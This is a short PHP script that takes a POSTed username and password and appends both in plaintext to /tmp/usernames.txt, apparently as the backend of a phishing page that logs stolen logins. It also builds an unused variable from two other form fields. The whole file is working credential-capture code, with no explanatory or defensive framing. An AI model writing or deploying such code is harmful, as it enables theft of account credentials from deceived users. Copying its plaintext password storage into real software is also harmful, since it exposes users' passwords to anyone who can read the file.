<?php
if(isset($_POST['username']) && isset($_POST['password'])) {
    $data = $_POST['field1'] . '-' . $_POST['field2'] . "\r\n";
    $ret = file_put_contents('/tmp/usernames.txt', "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('There was an error writing this file');
    }
    else {
        echo "$ret bytes written to file";
    }
}
else {
   die('no post data to process');
}



